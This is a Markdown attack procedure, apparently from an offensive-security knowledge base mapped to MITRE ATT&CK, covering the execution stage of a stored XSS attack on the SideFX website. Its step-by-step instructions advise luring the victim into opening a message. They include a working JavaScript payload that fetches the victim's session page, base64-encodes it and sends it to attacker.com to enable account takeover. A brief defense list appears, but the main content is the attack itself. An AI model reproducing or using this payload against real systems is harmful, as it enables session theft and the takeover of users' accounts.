---
tags:
  - exfiltration
  - session-theft
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 74607b5b-b756-4023-9765-e500cb886ee4
created_at: '2025-12-13T23:55:38.499Z'
updated_at: '2025-12-13T23:55:38.499Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Exfiltrate-Session-Data-via-XSS-Execution

## Summary

This procedure covers the execution phase where a victim views the malicious message, triggering the stored XSS payload to run JavaScript that fetches and exfiltrates session data from the SideFX account page to an attacker-controlled server.

## Description

Upon message opening, the unsanitized payload executes in the victim's browser context, allowing access to authenticated endpoints like /account/sessions/. Data is base64-encoded and sent via an img src request. This leads to session ID theft and account takeover in the web platform.

## Requirements

1. Victim must view the injected message
2. Attacker server ready to receive data (e.g., simple HTTP endpoint)
3. Payload already stored from prior injection

## Defense

Defensive measures and detection strategies:

- Use strict output encoding for all rendered message content
- Monitor for anomalous network requests from authenticated pages
- Implement session binding to user agents and IP for takeover prevention

## Objectives

1. Execute arbitrary JavaScript in victim browser
2. Collect sensitive session data
3. Enable account takeover via stolen credentials

## Instructions

### Step 1: Induce Victim Interaction

**Context**: Encourage or wait for the target to open the message.

The payload remains dormant until viewed; social engineering may prompt opening.

### Step 2: Payload Execution

**Context**: Trigger JavaScript to fetch session data.

The onerror handler runs: Fetch /account/sessions/, encode response, and exfil to attacker site.

```javascript
fetch('https://www.sidefx.com/account/sessions/').then(r => r.text()).then(d => {
  var img = new Image();
  img.src = 'https://attacker.com/steal?data=' + btoa(d);
});
```

**Expected Output**: Network request to attacker server with base64-encoded session data.

### Step 3: Validate Exfiltration

**Context**: Confirm data receipt on attacker side.

Check server logs for incoming requests containing session IDs.

**Expected Output**: Stolen session details, usable for takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Exfiltration]]
- [[Collection]]

